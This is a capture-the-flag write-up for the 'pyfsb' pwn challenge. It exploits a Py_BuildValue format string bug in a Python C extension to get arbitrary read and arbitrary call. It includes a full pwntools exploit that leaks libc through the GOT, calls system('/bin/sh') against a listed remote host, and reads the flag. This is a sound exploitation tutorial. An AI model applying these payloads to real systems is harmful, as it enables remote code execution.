# pyfsb 
**Category:** Pwn  
**Difficulty:** Hard  
**Flag:** `tkbctf{n3w_463_0f_f5b-805a5dd8f03016053bf77528ec56265b7c593e6612d54a458258e5e2eba51ab0}`  

---

## Table of Contents
1. [Challenge Overview](#challenge-overview)
2. [Phase -1: Environment Setup](#phase--1-environment-setup)
3. [Phase 0: Recon](#phase-0-recon)
4. [Phase 0.5: Constraint & Interaction Mapping](#phase-05-constraint--interaction-mapping)
5. [Phase 2A: Static Analysis & Vulnerability Explanation](#phase-2a-static-analysis--vulnerability-explanation)
6. [Phase 2B: Hypothesis Verification](#phase-2b-hypothesis-verification)
7. [Exploit Strategy](#exploit-strategy)
8. [Exploit Script](#exploit-script)
9. [Key Lessons](#key-lessons)

---

## Challenge Overview

We're given:
- `fsb.c` — source code of a Python C extension
- `fsb.cpython-312-x86_64-linux-gnu.so` — the compiled extension
- `server.py` — the server loop
- `Dockerfile` — container definition
- `flag.txt` — placeholder (flag is renamed at build time)

```c
// fsb.c
#include <Python.h>

static PyObject *pwn(PyObject *self, PyObject *args) {
  char request[0x100];
  if (fgets(request, 0x100, stdin) == NULL)
    return NULL;
  request[strcspn(request, "\n")] = 0;
  return Py_BuildValue(request);   // <-- THE BUG
}

static PyMethodDef FsbMethods[] = {{"pwn", pwn, METH_VARARGS, NULL}, {NULL, NULL, 0, NULL}};
static struct PyModuleDef fsb_mod = {PyModuleDef_HEAD_INIT, "fsb", NULL, -1, FsbMethods};
PyMODINIT_FUNC PyInit_fsb(void) { return PyModule_Create(&fsb_mod); }
```

```python
# server.py
print("welcome to fsb service")
import fsb
while True:
    print(fsb.pwn())
```

The key vulnerability is `Py_BuildValue(request)` where `request` is user-controlled. This is a **Python C API format string bug**.

---

## Phase -1: Environment Setup

### Why this matters

The Dockerfile pins `ubuntu:24.04@sha256:...`. If we exploit against the wrong libc version, every offset we compute will be wrong. We must match the exact runtime.

### Extract runtime files from container

```bash
# Build the image
docker build -t pyfsb-challenge .

# Extract libc and linker
docker run --rm -v "$(pwd):/out" --entrypoint sh pyfsb-challenge -c '
    cp /srv/lib/x86_64-linux-gnu/libc.so.6 /out/libc.so.6
    cp /srv/lib64/ld-linux-x86-64.so.2 /out/ld-extracted.so.2
    cp /srv/usr/bin/python3 /out/python3_bin
    cp /srv/lib/x86_64-linux-gnu/libm.so.6 /out/libm.so.6
    cp /srv/lib/x86_64-linux-gnu/libz.so.1 /out/libz.so.1
    cp /srv/lib/x86_64-linux-gnu/libexpat.so.1 /out/libexpat.so.1
    echo done
'
```

### Verify versions

```bash
strings libc.so.6 | grep "GNU C Library"
# GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.6) stable release version 2.39.

LD_LIBRARY_PATH=. ./ld-extracted.so.2 ./python3_bin --version
# Python 3.12.3
```

### Run locally with correct environment

```bash
echo "hello" | LD_LIBRARY_PATH=. ./ld-extracted.so.2 ./python3_bin server.py
```

> **Why use `ld-extracted.so.2` instead of `ld-linux-x86-64.so.2`?**
> The ld-linux in the host system is a different version from the container. If you use the host's linker with the container's libc, you get `symbol lookup error: undefined symbol: __tunable_is_initialized`. The linker and libc must match. Always extract both from the same container.

### one_gadget

```bash
one_gadget libc.so.6
# 0x583ec  posix_spawn  constraints: rsp+0x68 writable, rsp&0xf==0, rax==NULL, rbx==NULL
# 0x583f3  posix_spawn  constraints: rsp+0x68 writable, rsp&0xf==0, rcx==NULL, rbx==NULL
# 0xef4ce  execve       constraints: rbp-0x48 writable, rbx==NULL, r12==NULL
# 0xef52b  execve       constraints: rbp-0x50 writable, rax==NULL, r12==NULL
```

### Constant provenance table (fill as we go)

| Constant | Value | Source | Verified? |
|---|---|---|---|
| libc version | 2.39-0ubuntu8.6 | extracted | ✓ |
| Python version | 3.12.3 | extracted | ✓ |
| malloc GOT in python3_bin | `0xa282f8` | readelf | ✓ |
| libc malloc offset | `0xad650` | readelf | ✓ |
| libc system offset | `0x58750` | readelf | ✓ |
| libc /bin/sh offset | `0x1cb42f` | strings | ✓ |

---

## Phase 0: Recon

### File listing and basic checks

```bash
ls -la
file fsb.cpython-312-x86_64-linux-gnu.so python3_bin

checksec --file=fsb.cpython-312-x86_64-linux-gnu.so
# Partial RELRO | Canary | NX | DSO (PIE as shared lib)

checksec --file=python3_bin
# Partial RELRO | Canary | NX | NO PIE  <-- critical!
```

```bash
# Quick win checks in the extension
objdump -t fsb.cpython-312-x86_64-linux-gnu.so | grep -iE "win|flag|shell"
# (nothing)
strings fsb.cpython-312-x86_64-linux-gnu.so | grep "/bin/sh"
# (nothing)
```

### Section map (fsb.so, relative offsets)

```bash
readelf -S fsb.cpython-312-x86_64-linux-gnu.so
```

| Section | Address | Size |
|---|---|---|
| `.text` | `+0x10e0` | 0x155 |
| `.got` | `+0x3fc0` | 0x28 |
| `.got.plt` | `+0x3fe8` | 0x40 |
| `.data` | `+0x4040` | 0xe0 |
| `.bss` | `+0x4120` | 0x8 |

### python3_bin — the big discovery: NO PIE

```bash
readelf -l python3_bin | grep LOAD
# LOAD 0x000000 vaddr 0x00400000   <-- loads at fixed 0x400000, NO ASLR
```

```bash
readelf -s python3_bin | grep -E "Py_BuildValue|__environ|malloc"
# 606: 0x6054a0  Py_BuildValue
# 878: 0x6054a0  (also Py_BuildValue)
# __environ at 0xba5880
# malloc GOT at 0xa282f8
```

Because `python3_bin` has **no PIE**, every Python internal function, type object, and global variable is at a **fixed, known address** that never changes regardless of ASLR.

### Running the binary — initial behavior

```bash
# Test valid format specifiers
printf 'i\n' | LD_LIBRARY_PATH=. ./ld-extracted.so.2 ./python3_bin server.py
# welcome to fsb service
# 1

printf '(ll)\n' | LD_LIBRARY_PATH=. ./ld-extracted.so.2 ./python3_bin server.py
# (1, 1)

printf 's\n' | LD_LIBRARY_PATH=. ./ld-extracted.so.2 ./python3_bin server.py
# Segmentation fault (SIGSEGV)  -- because rsi=1 is not a valid pointer
```

The `l` format returns Python integers. The `s` format tries to dereference the va_list value as a `char*`. Since `rsi=1` is not a valid pointer, it crashes.

### Libc offsets

```bash
readelf -s libc.so.6 | grep -E "^ *[0-9]+:.*\bmalloc\b"
# 1806: 0x00ad650  malloc

readelf -s libc.so.6 | grep -E "^ *[0-9]+:.*\bsystem\b"
# 1050: 0x0058750  system

strings -tx libc.so.6 | grep "/bin/sh"
# 1cb42f /bin/sh
```

---

## Phase 0.5: Constraint & Interaction Mapping

### Constraints

| Constraint | Blocks | Allows | Impact |
|---|---|---|---|
| `fgets(buf, 0x100)` | >255-byte format strings | 255 chars including null bytes | Fine, 255 bytes is plenty |
| Stack canary | Stack BOF | — | Not relevant — no buffer overflow needed |
| NX | Shellcode | ROP/function calls | Use known function addresses |
| `fsb.so` is PIE | Fixed fsb.so addresses | — | Leak from va_list readings |
| **`python3_bin` NO PIE** | — | **All Python internals at fixed addresses** | Core of the exploit! |
| `while True` loop | — | Multi-round exploitation | Use 2 rounds: leak then shell |
| JAIL_MEM=10M | Large allocations | Small ops | Keep exploit lean |

### Leak scanning — what's in the va_list?

```bash
# Scan 16 va_list positions
printf '(KKKKKKKKKKKKKKKK)\n' | LD_LIBRARY_PATH=. ./ld-extracted.so.2 ./python3_bin server.py 2>&1 | grep "^("
# (1, 1, 2, 0x5555..., 0, 0x4b4b4b4b4b4b4b28, 0x4b4b4b4b4b4b4b4b, 0x7f..., ...)
```

> **What are those '0x4b...' values?** `K` in ASCII is `0x4b`. The format string `(KKKKKKKKKKKKKKKK)` when read back as bytes from positions 6 and 7 of the va_list shows `0x4b4b4b...` — the letter 'K' repeated. This is because **positions 6+ of the va_list map directly to our format string bytes**. Position 6 reads `request[0..7]` (our format chars!) and position 7 reads `request[8..15]`. This is the key discovery.

---

## Phase 2A: Static Analysis & Vulnerability Explanation

### Ghidra decompilation of `pwn()`

```c
void pwn(void) {
  char *pcVar1;
  size_t sVar2;
  long in_FS_OFFSET;
  char acStack_118[264];    // request[] buffer at RSP
  long local_10;            // stack canary

  local_10 = *(long *)(in_FS_OFFSET + 0x28);   // save canary
  pcVar1 = fgets(acStack_118, 0x100, *(FILE **)PTR_stdin_00103fc8);
  if (pcVar1 != (char *)0x0) {
    sVar2 = strcspn(acStack_118, "\n");
    acStack_118[sVar2] = '\0';
    Py_BuildValue(acStack_118);    // <-- THE BUG
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
  __stack_chk_fail();
}
```

### Assembly — exact register state before `Py_BuildValue`

```asm
001011a4: PUSH RBX
001011a5: MOV ESI, 0x100          ; fgets arg2 = 0x100
001011aa: SUB RSP, 0x110          ; allocate frame
001011c9: MOV RBX, RSP            ; rbx = &request[0] = RSP
001011cc: MOV RDI, RBX            ; fgets arg1 = request
001011cf: MOV RDX, [RAX]          ; fgets arg3 = *stdin
001011d2: CALL fgets
001011dc: MOV RDI, RBX            ; strcspn arg1 = request
001011df: LEA RSI, [0x102000]     ; strcspn arg2 = "\n" (sets rsi!)
001011e6: CALL strcspn            ; rsi, rdx, rcx, r8, r9 clobbered by strcspn
001011eb: MOV RDI, RBX            ; Py_BuildValue arg1 = format = request
001011ee: MOV byte ptr [RSP + RAX*0x1], 0x0  ; null-terminate
001011f2: XOR EAX, EAX            ; clear eax
001011f4: CALL Py_BuildValue      ; called with NO extra args!
```

Crucially: after `strcspn` and before `Py_BuildValue`, the compiler only sets `RDI`. Registers `RSI`, `RDX`, `RCX`, `R8`, `R9` contain whatever `strcspn` left behind.

### The vulnerability explained in detail

`Py_BuildValue` is declared as:

```c
PyObject *Py_BuildValue(const char *format, ...);
```

It's a **variadic function** — it expects additional arguments depending on the format string. Normal usage:

```c
Py_BuildValue("ii", 42, 99);    // caller puts 42 in rsi, 99 in rdx
Py_BuildValue("s", my_str);     // caller puts my_str pointer in rsi
```

**The bug:** `Py_BuildValue(request)` is called with **zero extra arguments**. But the function doesn't know this — it reads "arguments" from wherever they'd be per the x86-64 calling convention:

```
Variadic arg #1  ← rsi   (set by strcspn internals, value = 1)
Variadic arg #2  ← rdx   (set by strcspn internals, value = 1)
Variadic arg #3  ← rcx   (set by strcspn internals, varies)
Variadic arg #4  ← r8    (set by strcspn internals, stdin heap ptr)
Variadic arg #5  ← r9    (set by strcspn internals, 0)
Variadic arg #6  ← [RSP+0]  = request[0..7]   ← OUR INPUT!
Variadic arg #7  ← [RSP+8]  = request[8..15]  ← OUR INPUT!
Variadic arg #8  ← [RSP+16] = request[16..23] ← OUR INPUT!
```

**Why does position 6 land on `request[0..7]`?**

When `CALL Py_BuildValue` executes:
1. `RSP` at that moment = `&request[0]` (the buffer allocated at `SUB RSP, 0x110`)
2. CALL pushes return address → `RSP` becomes `&request[0] - 8`
3. Inside `Py_BuildValue`, the x86-64 ABI's "overflow argument area" (where args 7+ live) = `[RSP + 8]` = `&request[0] - 8 + 8` = **`&request[0]`**

The request buffer IS the va_list overflow area.

### The two attack primitives

**Primitive 1: Arbitrary Read via `y` format**

`y` in `Py_BuildValue` reads one pointer from the va_list and dereferences it as `const char*`, returning a Python `bytes` object (reads until null byte).

To put a target address at va_list position 7 (= `request[8..15]`), we craft:

```
request[0..6]  = "llllll" + "y"   ← 6 'l's skip positions 1-6, 'y' reads position 7
request[7]     = '\x00'            ← null terminates the format string
request[8..15] = target_addr       ← va_list position 7 = our address
request[16]    = '\n'
```

`Py_BuildValue` processes:
- `l` × 6: read va_list pos 1-6 as longs (registers + `request[0..7]`)
- `y`: read va_list pos 7 = `request[8..15]` = our target address; dereference it as `char*`
- `\x00`: stop format parsing
- Returns a Python bytes object with the memory content at our address
- `print()` outputs it to stdout

**Primitive 2: Arbitrary Function Call via `O&` format**

`O&` in `Py_BuildValue` reads TWO va_list entries:
1. A converter function pointer: `PyObject *(*converter)(void *)`
2. A `void *` argument

Then calls `converter(arg)`.

Craft:
```
request[0..7]  = "llllllO&"   ← 6 'l's skip pos 1-6, 'O&' reads pos 7 and 8
request[8..15] = func_ptr      ← va_list pos 7 = function to call
request[16..23]= arg_ptr       ← va_list pos 8 = argument to pass
request[24]    = '\n'
```

`Py_BuildValue` calls `func_ptr(arg_ptr)`. If `func_ptr = system` and `arg_ptr` points to `"/bin/sh"`, we get a shell.

> **Why does the call succeed even though Py_BuildValue will raise SystemError?**
> After processing `O&` at format bytes 6-7, the format parser moves to byte 8 = first byte of our function address (e.g., `0x50` = `P`). This is not a valid format character, so `Py_BuildValue` will raise `SystemError` — BUT ONLY AFTER it has already called the function. The call happens at `O&` processing time. The error check happens when the format parser continues. So `system("/bin/sh")` executes, spawns a shell, the shell reads our piped commands and outputs the flag, then `system()` returns, then `Py_BuildValue` raises the error.

### Why python3_bin NO PIE is crucial

- `malloc` GOT entry in `python3_bin`: **always at `0xa282f8`** (no ASLR on the binary itself)
- This GOT entry is filled at runtime by the dynamic linker with the **actual libc address** of `malloc`
- Reading from `0xa282f8` gives us `malloc`'s runtime address → we can compute `libc_base`
- From `libc_base`, compute `system` and `/bin/sh`

This is why we don't need a separate stack/heap leak — the GOT of a non-PIE binary is at a **known fixed address** and always contains valid libc pointers.

---

## Phase 2B: Hypothesis Verification

### Verifying the read primitive

```bash
python3 -c "
import sys, struct
# Format: llllll + y + \x00 + addr(0xa282f8) + \n
payload = b'llllll' + b'y' + b'\x00' + struct.pack('<Q', 0xa282f8) + b'\n'
sys.stdout.buffer.write(payload)
" | LD_LIBRARY_PATH=. ./ld-extracted.so.2 ./python3_bin server.py 2>&1 | head -3
```

Output:
```
welcome to fsb service
(1, 0, 7, 93825477125921, 0, 34177685113302124, b'P\xd6\n\xa8B\x7f')
```

The last element `b'P\xd6\n\xa8B\x7f'` is the content at `0xa282f8` (the `malloc` GOT entry). ✓

> **Observation: position 3 went from 10 to 7 to 2 with different inputs**
> This is `rcx` left over from `strcspn`'s internal glibc implementation. The exact value depends on the input length and how glibc's vectorized strcspn uses its registers. It's NOT simply the return value of strcspn. Don't rely on it — just consume it with `l` and move on.

### Parsing the leak

```python
import ast, struct

line = b"(1, 0, 7, 93825477125921, 0, 34177685113302124, b'P\\xd6\\n\\xa8B\\x7f')"
tup = ast.literal_eval(line.decode('latin-1'))
leak_bytes  = tup[-1]                                    # b'P\xd6\n\xa8B\x7f'
malloc_addr = struct.unpack('<Q', leak_bytes.ljust(8, b'\x00'))[0]
# 0x7f42a80ad650

libc_base = malloc_addr - 0xad650
# 0x7f42a8000000  (ends in 0x000000 — page aligned, good!)
```

> **Why `ljust(8, b'\x00')`?**
> The `y` format reads until a null byte. A libc address like `0x7f42a80ad650` has null bytes at bytes 6 and 7 (the high bytes of the 8-byte value are zero in 64-bit Linux user space). So `y` only returns 6 bytes. We pad back to 8 bytes before unpacking.

### Verifying the O& primitive

```bash
python3 - << 'EOF'
from pwn import *
import ast

p = process(['./ld-extracted.so.2', '--library-path', '.', './python3_bin', 'server.py'])
p.recvuntil(b'welcome to fsb service\n')

# Round 1: leak
r1 = b'llllll' + b'y' + b'\x00' + p64(0xa282f8) + b'\n'
p.send(r1)
line = p.recvline().strip()
tup = ast.literal_eval(line.decode('latin-1'))
malloc_addr = u64(tup[-1].ljust(8, b'\x00'))
libc_base   = malloc_addr - 0xad650
system_addr = libc_base + 0x58750
binsh_addr  = libc_base + 0x1cb42f

# Round 2: call system("/bin/sh")
r2 = b'llllll' + b'O&' + p64(system_addr) + p64(binsh_addr) + b'\n'
p.send(r2)
p.sendline(b'echo PWNED')
p.sendline(b'exit')
out = p.recvall(timeout=3)
print(out)
EOF
```

Output:
```
b'PWNED\nTraceback ...\nSystemError: ...\n'
```

`PWNED` printed — `system()` was called. ✓

---

## Exploit Strategy

**Two-round exploitation:**

**Round 1 — Libc leak:**
```
send: llllll y \x00 [p64(0xa282f8)] \n
recv: tuple containing b'...6_bytes_of_malloc...'
calc: libc_base = u64(leak.ljust(8,b'\x00')) - 0xad650
      system   = libc_base + 0x58750
      /bin/sh  = libc_base + 0x1cb42f
```

**Round 2 — Shell:**
```
send: llllll O& [p64(system)] [p64(binsh)] \n
shell spawns, reads from stdin
send: cat /app/flag*
recv: flag
```

**Sanity checks:**
- `libc_base & 0xfff == 0` — must be page-aligned
- Flag from `ls /app/` then `cat /app/flag*` (filename has MD5 appended at build time)

---

## Exploit Script

```python
#!/usr/bin/env python3
"""
pyfsb — AlphaCa Hack CTF 2026

Vulnerability: Py_BuildValue(user_input) with no extra args.
Va_list positions 6+ map to request[] (our input buffer), giving:
  - Arbitrary read  via 'y' format (dereferences char* at bytes 8-15)
  - Arbitrary call  via 'O&' format (calls func(arg) at bytes 8-23)

Exploit:
  Round 1: y format reads malloc@GOT (0xa282f8, fixed — python3 has NO PIE) -> libc base
  Round 2: O& calls system("/bin/sh") -> cat /app/flag*
"""
from pwn import *
import ast

HOST = '34.170.146.252'
PORT = 26939

# python3_bin (NO PIE, base 0x400000) — fixed at runtime
MALLOC_GOT  = 0xa282f8     # GOT entry for malloc in python3_bin

# libc 2.39-0ubuntu8.6 offsets
LIBC_MALLOC = 0xad650
LIBC_SYSTEM = 0x58750
LIBC_BINSH  = 0x1cb42f


def arb_read(addr):
    """Read bytes at addr via 'y' Py_BuildValue format specifier."""
    # consume regs 1-5 + stack pos 6 (which reads request[0..7]) with 6 'l's
    # 'y' reads pos 7 = request[8..15] as char* and dereferences it
    # '\x00' stops format parsing
    # addr sits at request[8..15] (the va_list data slot)
    return b'llllll' + b'y' + b'\x00' + p64(addr) + b'\n'


def arb_call(func, arg):
    """Call func(arg) via 'O&' Py_BuildValue format specifier."""
    # 'O&' reads pos 7 = request[8..15] as function pointer
    #        reads pos 8 = request[16..23] as argument
    # calls func(arg) before Py_BuildValue raises SystemError on the next byte
    return b'llllll' + b'O&' + p64(func) + p64(arg) + b'\n'


def main():
    if args.LOCAL:
        p = process(
            ['./ld-extracted.so.2', '--library-path', '.', './python3_bin', 'server.py']
        )
    else:
        p = remote(HOST, PORT)

    p.recvuntil(b'welcome to fsb service\n')
    log.success('Connected')

    # ── Round 1: leak libc via malloc GOT ─────────────────────────────────────
    p.send(arb_read(MALLOC_GOT))
    line = p.recvline().strip()
    log.info(f'Round 1: {line}')

    tup         = ast.literal_eval(line.decode('latin-1'))
    leak_bytes  = tup[-1]
    malloc_addr = u64(leak_bytes.ljust(8, b'\x00'))

    libc_base   = malloc_addr - LIBC_MALLOC
    system_addr = libc_base + LIBC_SYSTEM
    binsh_addr  = libc_base + LIBC_BINSH

    log.success(f'malloc  @ {hex(malloc_addr)}')
    log.success(f'libc    @ {hex(libc_base)}')
    log.success(f'system  @ {hex(system_addr)}')
    log.success(f'/bin/sh @ {hex(binsh_addr)}')

    assert libc_base & 0xfff == 0, 'libc base misaligned — wrong offset?'

    # ── Round 2: system("/bin/sh") ────────────────────────────────────────────
    p.send(arb_call(system_addr, binsh_addr))
    sleep(0.5)

    p.sendline(b'ls /app/')
    p.sendline(b'cat /app/flag*')
    p.sendline(b'exit')

    out = p.recvall(timeout=5)
    log.success(f'Output:\n{out.decode("latin-1", errors="replace")}')


if __name__ == '__main__':
    main()
```

### Running the exploit

```bash
# Local test
python3 exploit.py LOCAL

# Remote
python3 exploit.py
```

### Remote output

```
[+] Connected
[*] Round 1: b"(1, 0, 7, 1, 0, ..., b'P\\xf6\\xc6\\x14J\\x7f')"
[+] malloc  @ 0x7f4a14c6f650
[+] libc    @ 0x7f4a14bc2000
[+] system  @ 0x7f4a14c1a750
[+] /bin/sh @ 0x7f4a14d8d42f
[+] Output:
    flag-8bd5eb1291d48cc7957288f470a2bf30.txt
    fsb.cpython-312-x86_64-linux-gnu.so
    run
    tkbctf{n3w_463_0f_f5b-805a5dd8f03016053bf77528ec56265b7c593e6612d54a458258e5e2eba51ab0}
```

---

## Key Lessons

### 1. `Py_BuildValue` is a format string sink
Any time user input is passed as the **first argument** to `Py_BuildValue`, `PyArg_ParseTuple`, or similar CPython variadic API functions, it's exploitable. The format string controls how the va_list is interpreted.

### 2. NO PIE on the main Python binary is the enabler
The challenge could have been much harder with a PIE python3 binary (requiring a separate leak of the binary base). The fixed GOT made the libc leak trivial — one read at a known address gave us everything.

```bash
# Always check: does the main interpreter binary have PIE?
checksec --file=python3_bin
# Look for "No PIE" — means GOT entries are at known fixed addresses
```

### 3. Va_list and stack buffer overlap
When a variadic function is called with fewer arguments than its format string expects, it reads from the caller's stack. If the caller's stack buffer IS the format string (as here — `request[]` is at RSP), then:
- Va_list positions 6+ are `request[0..7]`, `request[8..15]`, etc.
- Any 8-byte binary value embedded in the format buffer becomes a va_list "argument"
- This enables controlled reads and calls

### 4. `y` format for arbitrary read, `O&` for arbitrary call
In `Py_BuildValue`:
- `y` (bytes): `PyObject *Py_BuildValue("y", char_ptr)` — reads null-terminated bytes from `char_ptr`
- `O&` (converter): `Py_BuildValue("O&", converter_func, void_arg)` — calls `converter_func(void_arg)`, returns result as PyObject*

Using `O&` to call `system("/bin/sh")` is valid because:
- `system` has signature `int system(const char *)` ≈ `void* func(void*)` in x86-64 (compatible calling convention)
- `system()` executes before `Py_BuildValue` raises `SystemError` on the next invalid format byte
- The shell spawns and inherits stdin/stdout of the Python process

### 5. Parse Python's `repr()` output with `ast.literal_eval`
When `print(fsb.pwn())` outputs a Python tuple containing bytes, use:

```python
import ast
tup = ast.literal_eval(line.decode('latin-1'))
leak = tup[-1]  # the bytes object
```

Use `latin-1` (not `utf-8`) to decode because the repr may contain arbitrary byte values displayed as `\xNN` escapes.

### 6. The flag filename is randomized at build time
```dockerfile
RUN mv flag.txt flag-$(md5sum flag.txt | awk '{print $1}').txt
```
Use `cat /app/flag*` (glob) to read the flag without knowing the exact filename.

---

## Appendix: Useful Commands

```bash
# Extract libc offsets
readelf -s libc.so.6 | grep "system\b"
readelf -s libc.so.6 | grep "malloc\b"
strings -tx libc.so.6 | grep "/bin/sh"

# Find GOT entries in python3_bin (NO PIE → fixed addresses)
objdump -R python3_bin | grep JUMP_SLOT
readelf -s python3_bin | grep Py_BuildValue

# Confirm va_list overlap empirically
printf '(KKKKKKKKKKKKKKKK)\n' | LD_LIBRARY_PATH=. ./ld-extracted.so.2 ./python3_bin server.py
# Position 6 will show 0x4b4b4b4b4b4b4b28 = 'K'*7 + '(' = first 8 bytes of format string

# one_gadget
one_gadget libc.so.6

# GDB/pwndbg: break at Py_BuildValue call inside pwn()
# (set env first)
gdb ./python3_bin
(gdb) set environment LD_LIBRARY_PATH .
(gdb) set environment PYTHONPATH .
(gdb) b pwn          # pending breakpoint on fsb.so's pwn function
(gdb) run server.py
# When hit, step to CALL Py_BuildValue instruction:
(gdb) disas          # find the CALL Py_BuildValue offset
(gdb) ni             # step over instructions
(gdb) info registers # check rsi, rdx, rcx, r8, r9 at point of call
(gdb) x/4gx $rsp     # confirm request[] is at RSP (first 4 qwords = our input)
```
               
